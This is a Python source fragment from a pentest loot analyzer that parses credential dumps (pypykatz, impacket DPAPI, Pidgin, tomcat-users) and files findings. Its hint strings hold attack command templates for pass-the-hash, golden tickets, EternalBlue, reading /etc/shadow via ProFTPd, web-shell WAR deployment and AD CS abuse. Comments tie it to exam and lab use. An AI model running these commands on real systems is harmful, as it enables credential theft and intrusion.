        _u_sh_lsa = (user or svc).replace("'", "'\\''")
        _pw_sh_lsa = pw.replace("'", "'\\''")
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"LSA _SC_{svc} service account: {principal}:{pw}",
                   hint=(f"impacket LSA secret - PLAINTEXT password of the {svc} service account; "
                         f"silver-ticket/lateral primitive: "
                         f"nxc smb <host> -u '{_u_sh_lsa}' -p '{_pw_sh_lsa}'"))
        if store is not None:
            store.add(Evidence(kind="plaintext", user=user, plaintext=pw,
                               source=path, line=_ln(m)))

    # iter-18: pypykatz MSV block (Linux/cross-platform mimikatz alternative)
    _PYPYKATZ_MSV = re.compile(
        r'(?i)==\s*MSV\s*==[\s\S]{0,400}?Username\s*:\s*(\S{1,40})\s*\n'
        r'[\s\S]{0,200}?Domain\s*:\s*(\S{1,40})\s*\n[\s\S]{0,400}?'
        r'\bNT\s*:\s*([a-f0-9]{32})\b'
        r'(?:[\s\S]{0,300}?\bDPAPI\s*:\s*([a-f0-9]{32})\b)?')
    _PYPYKATZ_BLEED = re.compile(r'(?i)==\s*(?:MSV|WDIGEST|Kerberos|SSP|LiveSSP|TsPkg|DPAPI|CredentialKeys)\s*[=\[]')
    for m in _PYPYKATZ_MSV.finditer(text):
        if not _no_bleed(m, 1, 3, _PYPYKATZ_BLEED):
            continue
        u, dom, nt = m.group(1), m.group(2), m.group(3)
        dpapi = m.group(4)
        if filters.is_blank_hash(nt) or filters.is_canonical_sample(nt):
            continue
        # iter-174: shell-escape u for hint splice.
        _u_sh_pk = u.replace("'", "'\\''")
        report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
                   f"pypykatz NT {dom}\\{u}: {nt}",
                   hint=f"PtH: nxc smb <host> -d {dom} -u '{_u_sh_pk}' -H {nt} | crack: hashcat -m 1000 <nt> rockyou.txt")
        HASHES.append(("1000", "NTLM", nt, path, _ln(m)))
        if store is not None:
            store.add(Evidence(kind="hash", user=u, hash=nt, hash_mode="1000",
                               domain=dom, source=path, line=_ln(m)))
        if dpapi and not filters.is_canonical_sample(dpapi):
            report.add("HIGH", "ASSIGNED SECRETS", path, _ln(m),
                       f"pypykatz DPAPI user-key {dom}\\{u}: {dpapi}",
                       hint=f"impacket-dpapi credential -key {dpapi} <CredFile>  - skips masterkey cracking")
            if store is not None:
                store.add(Evidence(kind="dpapi_key", user=u, plaintext=dpapi,
                                   domain=dom, source=path, line=_ln(m)))

    # iter-18: pypykatz WDIGEST cleartext block
    _PYPYKATZ_WDIGEST = re.compile(
        r'(?i)==\s*WDIGEST\s*\[[0-9a-f]{4,}\]==\s*\n'
        r'\s*username\s+(\S{1,40})\s*\n'
        r'\s*domainname\s+(\S{1,40})\s*\n'
        r'\s*password\s+(?!\(null\)|None\b)([^\r\n]{3,80})\s*\n'
        r'\s*password\s*\(hex\)')
    for m in _PYPYKATZ_WDIGEST.finditer(text):
        u, dom, pw = m.group(1), m.group(2), m.group(3).strip()
        if filters.is_placeholder(pw):
            continue
        # iter-174: shell-escape u + pw.
        _u_sh_pw = u.replace("'", "'\\''")
        _pw_sh_pw = pw.replace("'", "'\\''")
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"pypykatz wdigest cleartext: {dom}\\{u}:{pw}",
                   hint=f"reuse: nxc smb <host> -d {dom} -u '{_u_sh_pw}' -p '{_pw_sh_pw}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw, domain=dom,
                               source=path, line=_ln(m)))

    # iter-18: pypykatz Kerberos cleartext block (separate from the aes-key
    # single-line rule which is dispatched in _AD).
    _PYPYKATZ_KERB = re.compile(
        r'(?is)==\s*Kerberos\s*==[\s\S]{0,400}?Username\s*:\s*(\S{1,40})'
        r'[\s\S]{0,200}?Domain\s*:\s*(\S{1,80})'
        r'[\s\S]{0,200}?Password\s*:\s*(?!\(null\)|None|n/a|\s*$)([^\r\n]{3,80})')
    for m in _PYPYKATZ_KERB.finditer(text):
        if not _no_bleed(m, 1, 3, _PYPYKATZ_BLEED):
            continue
        u, dom, pw = m.group(1), m.group(2), m.group(3).strip()
        if filters.is_placeholder(pw):
            continue
        # iter-174: shell-escape u + pw.
        _u_sh_pkk = u.replace("'", "'\\''")
        _pw_sh_pkk = pw.replace("'", "'\\''")
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"pypykatz Kerberos cleartext: {dom}\\{u}:{pw}",
                   hint=f"reuse: nxc smb <host> -d {dom} -u '{_u_sh_pkk}' -p '{_pw_sh_pkk}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw, domain=dom,
                               source=path, line=_ln(m)))

    # iter-18: pypykatz DPAPI masterkey block (sha1_masterkey for impacket-dpapi)
    _PYPYKATZ_DPAPI_MK = re.compile(
        r'(?im)^[ \t]*key_guid[ \t]+\{([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-'
        r'[0-9a-f]{4}-[0-9a-f]{12})\}[\s\S]{0,400}?'
        r'^[ \t]*sha1_masterkey[ \t]+([0-9a-f]{40})\b')
    for m in _PYPYKATZ_DPAPI_MK.finditer(text):
        if filters.is_doc_file(path):
            continue
        guid, sha1 = m.group(1), m.group(2)
        if filters.is_canonical_sample(sha1):
            continue
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"DPAPI masterkey (pypykatz): {{{guid}}} sha1={sha1}",
                   hint=f"dpapi.py credential -key 0x{sha1} <blob>  - decrypts Chrome/RDP/Vault/PFX bound to this GUID")
        # iter-24: store the masterkey sha1 + GUID so the chain engine can
        # pair it with any Credential blob the same scan emits.
        if store is not None:
            store.add(Evidence(kind="dpapi_mk", source=path, line=_ln(m),
                               meta={"guid": guid, "sha1": sha1}))

    # iter-18: pypykatz SSP / LiveSSP / TsPkg / CredentialKeys block
    _PYPYKATZ_SSP = re.compile(
        r'(?im)^==\s*(?:SSP|LiveSSP|TsPkg|CredentialKeys|MSV|WDIGEST|Kerberos)\s*'
        r'(?:\[[0-9a-f]+\])?\s*==\s*$'
        r'[\s\S]{0,400}?^\s*username\s+(\S{1,80})\s*$'
        r'[\s\S]{0,400}?^\s*domainname\s+(\S{1,80})\s*$'
        r'[\s\S]{0,400}?^\s*password\s+(?!\(hex\))(?!\(null\))([^\r\n]{3,200})\s*$')
    for m in _PYPYKATZ_SSP.finditer(text):
        if not _no_bleed(m, 1, 3, _PYPYKATZ_BLEED):
            continue
        u, dom, pw = m.group(1), m.group(2), m.group(3).strip()
        if filters.is_placeholder(pw):
            continue
        # iter-176: shell-escape u + pw.
        _u_sh_ssp = u.replace("'", "'\\''")
        _pw_sh_ssp = pw.replace("'", "'\\''")
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"pypykatz SSP cleartext: {dom}\\{u}:{pw}",
                   hint=f"reuse: nxc smb <host> -d {dom} -u '{_u_sh_ssp}' -p '{_pw_sh_ssp}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw, domain=dom,
                               source=path, line=_ln(m)))

    # iter-18: impacket dpapi.py [CREDENTIAL] block (cleartext under "Unknown:" field)
    _IMPACKET_DPAPI_CRED = re.compile(
        r'(?is)\[CREDENTIAL\][\s\S]{0,400}?'
        r'Target\s*:\s*([^\r\n]{3,120})[\s\S]{0,400}?'
        r'Username\s*:\s*([^\r\n]{1,80})[\s\S]{0,200}?'
        r'Unknown\s*:\s*(?!\s*$)([^\r\n]{3,200})')
    _IMP_CRED_BLEED = re.compile(r'\[CREDENTIAL\]')
    for m in _IMPACKET_DPAPI_CRED.finditer(text):
        if filters.is_doc_file(path):
            continue
        if not _no_bleed(m, 1, 3, _IMP_CRED_BLEED):
            continue
        target, u, pw = m.group(1).strip(), m.group(2).strip(), m.group(3).strip()
        if filters.is_placeholder(pw):
            continue
        # strip 'Domain:target=' / 'LegacyGeneric:target=' prefix
        target = re.sub(r'^(?:Domain|LegacyGeneric):target=', '', target)
        # reject when pw is pure hex (blob, not cleartext)
        if re.match(r'^[0-9a-fA-F]{16,}$', pw):
            continue
        # iter-176: shell-escape u + pw.
        _u_sh_dp = u.replace("'", "'\\''")
        _pw_sh_dp = pw.replace("'", "'\\''")
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"DPAPI Credential Manager {target}: {u}:{pw}",
                   hint=f"plaintext from impacket-dpapi; reuse: nxc smb/mssql/winrm -u '{_u_sh_dp}' -p '{_pw_sh_dp}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                               source=path, line=_ln(m)))

    # iter-17 (corpus mine wkl2kkzn5): nmap NSE smb-vuln-* output block
    # (HTB Blue / TryHackMe Blue EternalBlue). The script header + multi-line
    # body + State:VULNERABLE need file-scope context.
    if not filters.is_doc_file(path):
        _NMAP_SMB_VULN = re.compile(
            r'(?im)\|\s*(smb2?-vuln-[a-z0-9\-]+)\s*:[^\r\n]*\r?\n'
            r'(?:\|[^\r\n]*\r?\n){0,15}?\|[^\r\n]*\bState\s*:\s*VULNERABLE\b')
        for m in _NMAP_SMB_VULN.finditer(text):
            script_id = m.group(1)
            report.add("CRITICAL", "RECON", path, _ln(m),
                       f"nmap {script_id}: VULNERABLE",
                       hint=("OSCP+ allows manual single-target Metasploit: "
                             "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
                             "set RHOSTS <ip>; set LHOST <you>; run'  OR  public PoC: "
                             "worawit/MS17-010 send_and_execute.py <ip> <smbexe>"))

        # iter-17: ProFTPd mod_copy CPFR/CPTO (CVE-2015-3306, HTB Kenobi)
        _PROFTPD = re.compile(
            r'(?im)^\s*(?:ftp>\s+)?SITE\s+CPFR\s+(/\S+)[\s\S]{0,400}?'
            r'^\s*(?:ftp>\s+)?SITE\s+CPTO\s+(/\S+)')
        for m in _PROFTPD.finditer(text):
            src_p, dst_p = m.group(1), m.group(2)
            report.add("CRITICAL", "INTERESTING FILES", path, _ln(m),
                       f"ProFTPd mod_copy: CPFR {src_p} -> CPTO {dst_p}",
                       hint=("CVE-2015-3306 pre-auth arb-file-read: "
                             "curl -s ftp://anonymous@<ip>/ --quote 'SITE CPFR /etc/shadow' "
                             "--quote 'SITE CPTO /var/tmp/x'; then GET /var/tmp/x via FTP/HTTP"))

    # iter-11: Pidgin accounts.xml plaintext password block (multi-line XML)
    _PIDGIN = re.compile(
        r'(?is)<account>\s*<protocol>([a-z\-]{3,30})</protocol>\s*'
        r'<name>([^<\r\n]{1,120})</name>\s*<password>([^<\r\n]{3,120})</password>')
    for m in _PIDGIN.finditer(text):
        proto, u, p = m.group(1), m.group(2), m.group(3)
        if filters.is_placeholder(p):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"pidgin {proto}: {u}:{p}",
                   hint=f"plaintext IM cred; this acct often shares pw with the host or domain account")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                               source=path, line=_ln(m)))


def analyze(path, report, store=None):
    ext = os.path.splitext(path)[1].lower()
    require_quote = ext in _CODE_EXT
    seen_svc = set()
    # iter-218: per-file (user, pw) dedupe cache. A single URL query-string
    # cred that repeats across 2000 nginx access-log lines used to emit 2000
    # findings; now the same tuple emits once. Also caps total unique creds
    # per file at 40 (raised only when the file is a genuine cred store).
    _cred_seen_this_file = set()
    _plow_analyze = path.lower().replace("\\", "/")
    _is_log_file = (
        _plow_analyze.endswith((".log", ".log.gz", ".log.1", ".log.2",
                                  ".access", ".error", ".request", ".har"))
        or "/logs/" in _plow_analyze
        or "/log/" in _plow_analyze
        or "access.log" in _plow_analyze
        or "error.log" in _plow_analyze
        or "access_log" in _plow_analyze)
    # For genuine log files, cap CRED PAIRS emissions harder to keep the
    # report readable. For everything else (config, secretsdump output,
    # notes, walkthroughs), keep the generous cap.
    _cred_cap_this_file = 5 if _is_log_file else 40
    _cred_emit_ct = 0
    try:
        with open(path, "r", errors="ignore") as f:
            for lineno, line in enumerate(f, 1):
                line = line.rstrip("\n")
                if SKIP_LINE.match(line):
                    continue

                # ---- pass 0: learn netexec/cme service lines (no claim) ----
                if store is not None and _NXC_SVC.match(line):
                    _learn_nxc_service(line, path, store, seen_svc)
                    # fall through: credline may still pull a cred off this line

                # ---- pass 1: the credential-line classifier ----
                c = credline.classify(line)
                if c and c.kind in ("cred", "failed"):
                    who = (c.user or "<user>")
                    # iter-218: dedupe on (user, password, kind) tuple.
                    # A repeated log entry with the same cred emits once.
                    _cred_key = (who, c.password or "", c.kind)
                    if _cred_key in _cred_seen_this_file:
                        continue
                    if _cred_emit_ct >= _cred_cap_this_file:
                        # Hit the per-file cap. Log one summary marker on
                        # the first line that would exceed the cap, then
                        # silently drop everything after.
                        if _cred_emit_ct == _cred_cap_this_file:
                            report.add("INFO", "CRED PAIRS", path, lineno,
                                       f"iter-218: hit per-file CRED PAIRS "
                                       f"cap ({_cred_cap_this_file}) - "
                                       f"further unique pairs suppressed",
                                       hint=("log file dedupe active; "
                                             "raise cap if this file "
                                             "genuinely has more than "
                                             f"{_cred_cap_this_file} "
                                             "unique credentials"))
                            _cred_emit_ct += 1
                        continue
                    _cred_seen_this_file.add(_cred_key)
                    _cred_emit_ct += 1
                    tag = " (FAILED auth)" if c.kind == "failed" else ""
                    sev = "HIGH" if c.kind == "failed" else "CRITICAL"
                    label = (f"{c.note}: {c.password}" if c.note == "PowerShell SecureString"
                             else f"{who}:{c.password}{tag}")
                    # iter-141: shell-safe escape for pw hint (may carry ')
                    _pw_sh = (c.password or "").replace("'", "'\\''")
                    report.add(sev, "CRED PAIRS", path, lineno, label,
                               f"netexec smb <DC-IP> -u '{who}' -p '{_pw_sh}' -k")
                    if store is not None:
                        from analyzers.ingest.evidence import Evidence
                        store.add(Evidence(kind="plaintext", user=c.user,
                                           plaintext=c.password, domain=c.domain,
                                           source=path, line=lineno))
                    continue
                if c and c.kind == "pwdump":
                    # iter-13: feed the user<->NT binding into the Evidence
                    # store so the R7 chain engine sees it.
                    if store is not None and c.nt_hash:
                        from analyzers.ingest.evidence import Evidence
                        store.add(Evidence(kind="hash", user=c.user,
                                           hash=c.nt_hash, hash_mode="1000",
                                           domain=c.domain,
                                           source=path, line=lineno))
                        # iter-35: krbtgt = golden-ticket primitive. Emit a
                        # CRITICAL flag + separate kind='krbtgt' Evidence so
                        # correlate.py R-GOLDEN routes off it.
                        if c.user.lower() == "krbtgt":
                            report.add("CRITICAL", "PASSWORD HASHES",
                                       path, lineno,
                                       f"krbtgt NT hash: {c.nt_hash}",
                                       hint=("golden ticket primitive - forge "
                                             "any user (Administrator): "
                                             "impacket-ticketer -nthash "
                                             f"{c.nt_hash} -domain-sid "
                                             "<S-1-5-21-...> -domain "
                                             f"{c.domain or '<DOM>'} "
                                             "Administrator; export "
                                             "KRB5CCNAME=Administrator.ccache; "
                                             "impacket-secretsdump -k -no-pass "
                                             "'<DOM>/Administrator@<DC-FQDN>'"))
                            store.add(Evidence(kind="krbtgt", user="krbtgt",
                                               hash=c.nt_hash,
                                               domain=c.domain,
                                               source=path, line=lineno))
                    continue

                # ---- pass 2: inline-cred shapes ----
                hit = False
                # iter-7 (round 2): doc files (hardening guides, cheatsheets)
                # teach AutoLogon REG_SZ syntax and show 'Strong Passwords'
                # examples - skip all the inline-cred patterns here.
                _is_doc = filters.is_doc_file(path)
                for name, rx in _AD:
                    am = rx.search(line)
                    if not am:
                        continue
                    # autologon password in doc files is teaching content, not loot.
                    if _is_doc and name in ("autologon password",
                                            "SQL IDENTIFIED BY",
                                            "sshpass -p",
                                            "mysql -p inline",
                                            # iter-9: doc-file skips
                                            "Ansible Vault header",
                                            "PowerShell -enc payload",
                                            "GPP cpassword inline",
                                            "browser password CSV",
                                            # iter-219: tutorial .md pages
                                            # for Grafana provisioning YAML
                                            # and docker-compose env vars
                                            # showed up as FPs in wf_ff710e72
                                            # audit - the pattern examples
                                            # in tutorials look identical to
                                            # real configs but are teaching
                                            # content, not loot.
                                            "Grafana basicAuth",
                                            "docker env secret"):
                        continue
                    # iter-11 FP audit: MongoDB BSON shell output has TWO groups
                    # (user, pass) but no dedicated dispatch branch existed -
                    # the generic fallthrough only emitted group(1) (user) as
                    # ASSIGNED SECRETS, losing the pw value. Fix: split here.
                    if name == "MongoDB BSON":
                        u, p = am.group(1), am.group(2)
                        if not p or filters.is_placeholder(p) or filters.is_placeholder(u):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"MongoDB user: {u}:{p}",
                                   hint=f"mongosh 'mongodb://{u}:{p}@<host>:27017/'  - admin role allows db.adminCommand(...)")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # tomcat-users: user+pass+roles -> RCE-aware severity
                    if name == "tomcat-users":
                        u, p, roles = am.group(1), am.group(2), (am.group(3) or "")
                        if not p or filters.is_placeholder(p):
                            continue
                        rce = any(r in roles.lower() for r in
                                  ("manager-script", "manager-jmx", "admin-gui", "admin-script"))
                        sev = "CRITICAL" if rce else "HIGH"
                        cat = "CRED PAIRS" if rce else "ASSIGNED SECRETS"
                        hint = (f"tomcat WAR-deploy RCE: curl --upload-file shell.war "
                                f"-u '{u}:{p}' 'http://<host>:8080/manager/text/deploy?path=/shell'"
                                if rce else
                                f"tomcat login: u={u} p={p}; check /manager /host-manager")
                        report.add(sev, cat, path, lineno, f"tomcat user '{u}':{p}" +
                                   (f"  [{roles[:40]}]" if roles else ""), hint=hint)
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # FileZilla base64 obfuscation -> decode inline
                    if name == "FileZilla pass":
                        import base64 as _b64
                        try:
                            pw = _b64.b64decode(am.group(1), validate=True).decode("utf-8")
                        except Exception:
                            pw = am.group(1) + " (base64 - decode by hand)"
                        if filters.is_placeholder(pw):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"FileZilla saved password: {pw}",
                                   hint="FileZilla base64 obfuscation - reuse directly")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # Jenkins encrypted blob: flag the file (cannot decrypt without
                    # master.key + hudson.util.Secret) and point to the offline chain
                    if name == "Jenkins enc blob":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Jenkins credentials.xml encrypted blob",
                                   hint="offline decrypt: hoto/jenkins-credentials-decryptor -m secrets/master.key "
                                   "-s secrets/hudson.util.Secret -c credentials.xml")
                        hit = True
                        break
                    # Shadow credentials: msDS-KeyCredentialLink write or Certipy
                    # output. Intel-only (the NT hash recovered THROUGH this path
                    # is captured by the 'Certipy got-hash' rule below).
                    if name == "Shadow credentials":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Shadow Credentials marker (msDS-KeyCredentialLink)",
                                   hint="certipy-ad shadow auto -account <target> -u <user>@<dom> -p <pw> "
                                   "-> PKINIT -> NT hash via getnthash / U2U")
                        hit = True
                        break
                    # Certipy 'Got hash for X: LM:NT' -> CRITICAL user-bound NT hash
                    if name == "Certipy got-hash":
                        user, lm, nt = am.group(1), (am.group(2) or ""), am.group(3)
                        if not nt or filters.is_blank_hash(nt):
                            hit = True
                            break
                        report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                   f"NTLM (NT) {user}: {nt}",
                                   hint=f"PtH: netexec smb <DC-IP> -u '{user}' -H {nt}  |  crack: hashcat -m 1000 {nt} rockyou.txt")
                        # also feed the global HASHES list so --hashes file picks it up
                        from analyzers.patterns import HASHES
                        HASHES.append(("1000", "NTLM", nt, path, lineno))
                        hit = True
                        break
                    # LAPS cleartext (ms-Mcs-AdmPwd / Windows-LAPS) -> CRITICAL local admin pw
                    if name in ("LAPS ms-Mcs-AdmPwd", "LAPS v2 cleartext"):
                        pw = am.group(1).strip()
                        if filters.is_placeholder(pw) or len(pw) < 6:
                            hit = True
                            break
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"LAPS local admin password: {pw}",
                                   hint="local admin: netexec smb <host> -u Administrator -p '" + pw +
                                   "' --local-auth  | or evil-winrm -i <host> -u Administrator -p '" + pw + "'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user="Administrator",
                                               plaintext=pw, source=path, line=lineno))
                        hit = True
                        break
                    # gMSA blob marker - cannot decode without bloodyAD/gMSADumper auth
                    if name == "gMSA ManagedPassword":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "gMSA msDS-ManagedPassword blob",
                                   hint="gMSADumper.py -u <user> -p <pw> -d <dom> -l <dc>  (RetrievePrincipal right needed)")
                        hit = True
                        break
                    # ---- iter-6 INTEL markers ----
                    # Iter-7: doc/cheatsheet/tutorial files (`pentest-cheatsheet.md`,
                    # `AD-hardening-guide.md`, `bloodhound-acl-edges.md`,
                    # `kerberoasting-explained.txt`) are designed to TEACH these
                    # primitives, so the markers appear in prose constantly. The
                    # operator's loot never lives in those - we suppress intel
                    # detectors on them entirely.
                    if name in ("ADCS ESC", "RBCD marker", "BloodHound ACL edge",
                                "WSUS abuse", "DPAPI masterkey",
                                # iter-11 FP-audit additions (workflow wijdgt0aa)
                                "PEAS finding", "AlwaysInstallElevated",
                                "token impersonation", "Snaffler red",
                                "SUID GTFOBins", "Linux capability",
                                "NFS no_root_squash", "smbmap rw share",
                                "kerbrute valid user", "Helm values secret",
                                "Vault unseal key", "Vault root token",
                                "kubectl --token",
                                # iter-186 FP-audit additions: the 12
                                # bash-history rules added in iter-182/183/184
                                # all fire on walkthrough-style example
                                # commands in tutorial markdown files. Every
                                # HTB / THM / OSCP+ writeup showing sample
                                # `nxc smb host -u alice -p pw` or
                                # `psexec.py CORP/administrator:pw@10.10.10.10`
                                # is a doc file, not real loot.
                                "impacket inline",
                                "bash history PGPASSWORD",
                                "bash history MYSQL_PWD",
                                "bash history nxc/cme",
                                "bash history evil-winrm",
                                "bash history net use",
                                "bash history az login",
                                "bash history docker login",
                                "bash history piped sudo -S",
                                "bash history schtasks",
                                "bash history kubectl set-cred token",
                                "bash history kubectl set-cred pw",
                                # iter-187 additions (same FP class -
                                # DB CLI shapes appear in every tutorial).
                                "bash history redis-cli",
                                "bash history mongo -u",
                                "bash history cqlsh",
                                "bash history influx",
                                # iter-189 additions - CREATE USER and
                                # webhook URL patterns appear in every DB
                                # tutorial / DevOps integration guide.
                                "SQL CREATE USER",
                                "Slack webhook URL",
                                "Discord webhook URL",
                                "Teams webhook URL",
                                # iter-193 additions - opaque tokens appear
                                # in provider docs; PAM examples in privesc
                                # cheatsheets.
                                "opaque token prefix",
                                "PAM misconfig",
                                # iter-202 additions - Redis Sentinel + Vault
                                # tokens appear in DevOps tutorials.
                                "Redis Sentinel auth-pass",
                                "Vault token file",
                                ) and filters.is_doc_file(path):
                        continue
                    # AD CS ESC#: must look like ACTUAL certipy / certify output
                    # ('Vulnerabilities:', '[!] ESC1', 'Template Name :',
                    # 'Certipy v4...', 'EnableTemplate', 'ManageCA :', etc.),
                    # NOT a markdown bullet from a docs cheatsheet ('- ESC1:
                    # enrollee-supplies-subject ...'). Iter-7 FP audit: 11 doc
                    # FPs killed by this stricter gate.
                    if name == "ADCS ESC":
                        is_markdown_bullet = re.match(r'^\s*[-*]\s+ESC\d', line)
                        ctx = re.search(
                            r'(?i)Vulnerabilit(?:y|ies)\s*:|Certipy\s+v\d|certipy-ad|certify\.exe|'
                            r'\[\s*[!+*]\s*\]\s*ESC\d|Template\s+Name\s*:|EnableTemplate|'
                            r'Manage[CC]A\s*:|Manage[Cc]ertificates|ESC\d\s*\(|'
                            r'Enrollee\s+Supplies\s+Subject|Client\s+Authentication\s*:\s*True|'
                            r'Enrollment\s+Rights', line)
                        if is_markdown_bullet or not ctx:
                            continue
                        esc = am.group(0).upper()
                        # iter-21: per-ESC specific exploitation hints
                        # (replaces the generic 'certipy-ad req ...' wording).
                        ESC_HINTS = {
                            "ESC1": ("Enrollee-supplies-subject + Client Auth EKU: "
                                     "certipy-ad req -u <user>@<dom> -p <pw> -ca <CA> "
                                     "-template <T> -upn 'administrator@<dom>'; then "
                                     "certipy-ad auth -pfx <out>.pfx -> NT hash"),
                            "ESC2": ("Any-purpose EKU: certipy-ad req -u <user> -p <pw> "
                                     "-ca <CA> -template <T> -upn 'administrator@<dom>'; "
                                     "auth -pfx -> use cert for arbitrary purposes"),
                            "ESC3": ("Enrollment-agent + restrictions bypass: "
                                     "certipy-ad req -u <user> -p <pw> -ca <CA> "
                                     "-template <T> -on-behalf-of <victim>"),
                            "ESC4": ("Vulnerable template ACL (WriteOwner/WriteDacl etc.): "
                                     "certipy-ad template -u <user> -p <pw> -template <T> "
                                     "-write-default-configuration; then req as ESC1"),
                            "ESC6": ("EDITF_ATTRIBUTESUBJECTALTNAME2 on CA: any cert can "
                                     "be issued with a custom SAN. certipy-ad req with -upn"),
                            "ESC7": ("ManageCA + ManageCertificates rights: "
                                     "certipy-ad ca -u <user> -p <pw> -ca <CA> -enable-template SubCA; "
                                     "then req SubCA -> issue arbitrary cert"),
                            "ESC8": ("[LAB-ONLY] NTLM relay to web-enrollment (certsrv). "
                                     "NOT OSCP+-exam-legal (requires relay/coerced auth). "
                                     "manual chain not viable on exam"),
                            "ESC9": ("NoSecurityExtension on template: certipy-ad req with "
                                     "-upn 'administrator@<dom>' (UPN bypass when "
                                     "msDS-AllowedToActOnBehalfOfOtherIdentity is set)"),
                            "ESC10": ("Weak certificate-mapping (StrongCertificateBindingEnforcement=0 "
                                      "OR CertificateMappingMethods has UPN/SAN): "
                                      "certipy-ad req -upn '<victim>@<dom>'"),
                            "ESC11": ("[LAB-ONLY] IF_ENFORCEENCRYPTICERTREQUEST=0 enables "
                                      "NTLM-relay to ICPR. NOT OSCP+-exam-legal (relay-based). "
                                      "manual chain not viable on exam"),
                            "ESC13": ("msDS-OIDToGroupLink: issuance-policy OID linked to "
                                      "a group. certipy-ad req -template <T> -ca <CA> -u <user>; "
                                      "PKINIT auth grants group-membership PAC without password reset"),
                            "ESC15": ("Schannel + EnrolleeSuppliesSubject + Application-Policies: "
                                      "certipy-ad req -application-policies 'Client Authentication' "
                                      "-template WebServer; auth via Schannel / passthecert.py"),
                            "ESC16": ("Suppressed Security Extension via SubjectAltRequireUpn "
                                      "+ NTAuthCertificates write: certipy-ad req with -upn override; "
                                      "auth as administrator without password reset"),
                        }
                        hint = ESC_HINTS.get(esc, f"certipy-ad req ... ({esc}); then certipy-ad auth -pfx <out>.pfx -> NT hash / TGT")
                        # tag LAB-ONLY ESCs so the chain engine never elevates them
                        sev = "HIGH"
                        if esc in ("ESC8", "ESC11"):
                            sev = "MEDIUM"  # intel only - exam-prohibited
                        report.add(sev, "RECON", path, lineno,
                                   f"AD CS {esc} vulnerable template / right",
                                   hint=hint)
                        hit = True
                        break
                    if name == "RBCD marker":
                        report.add("HIGH", "RECON", path, lineno,
                                   "RBCD attribute (msDS-AllowedToActOnBehalfOfOtherIdentity)",
                                   hint="impacket-rbcd -delegate-from <ctrl> -delegate-to <target$> -action write ...; "
                                   "then getST.py -impersonate Administrator")
                        hit = True
                        break
                    if name == "BloodHound ACL edge":
                        # iter-7: even with a node-token after the arrow, lines
                        # inside backticks ('reading `--[GenericAll]-->` style')
                        # or wrapped in inline-code/quotes are explanatory prose.
                        if re.search(r'`[^`]*--\[[^`]+\]-->[^`]*`', line):
                            continue
                        edge = am.group(1)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"BloodHound ACL edge: {edge} (privilege-escalation path)",
                                   hint="abuse with bloodyAD / PowerView / dacledit per edge; shortest path to DA")
                        hit = True
                        break
                    if name == "WSUS abuse":
                        report.add("HIGH", "RECON", path, lineno,
                                   "WSUS update-push abuse (SharpWSUS)",
                                   hint="LAB-ONLY for the exam unless the WSUS host is in scope - signed-binary update -> SYSTEM on client/DC")
                        hit = True
                        break
                    if name == "DPAPI masterkey":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "DPAPI masterkey material",
                                   hint="impacket-dpapi masterkey -file <mk> -sid <SID> -password <pw>  (or -rpc on a box you own)")
                        hit = True
                        break
                    # ---- iter-7 round-2 completeness handlers ----
                    if name == "SQL INSERT cred row":
                        # capture group is the VALUES (...) tuple; extract every
                        # quoted value and look for a bcrypt/MD5/plain hash.
                        vals = re.findall(r"['\"]([^'\"]{2,80})['\"]", am.group(1))
                        # try to find a hash-shaped value; otherwise emit as cred
                        hashy = next((v for v in vals
                                      if re.match(r'^\$2[aby]\$|^\$1\$|^\$6\$|^\$5\$|'
                                                  r'^[a-f0-9]{32}$|^[a-f0-9]{40}$|'
                                                  r'^[a-f0-9]{60}$|^\$apr1\$', v)), None)
                        usery = next((v for v in vals if re.match(r'^[A-Za-z][\w@.-]{1,40}$', v) and len(v) <= 40), None)
                        if hashy:
                            report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                       f"SQL dump user: {usery or '<unknown>'}  hash: {hashy[:60]}",
                                       hint="check hashid then hashcat -m <mode>; common: bcrypt -m 3200, md5 -m 0")
                            from analyzers.patterns import HASHES
                            if hashy.startswith("$2"): HASHES.append(("3200", "bcrypt", hashy, path, lineno))
                            elif hashy.startswith("$1$"): HASHES.append(("500", "md5crypt", hashy, path, lineno))
                            elif hashy.startswith("$6$"): HASHES.append(("1800", "sha512crypt", hashy, path, lineno))
                            elif hashy.startswith("$apr1$"): HASHES.append(("1600", "apr1", hashy, path, lineno))
                            elif len(hashy) == 32: HASHES.append(("0", "MD5", hashy, path, lineno))
                        hit = True
                        break
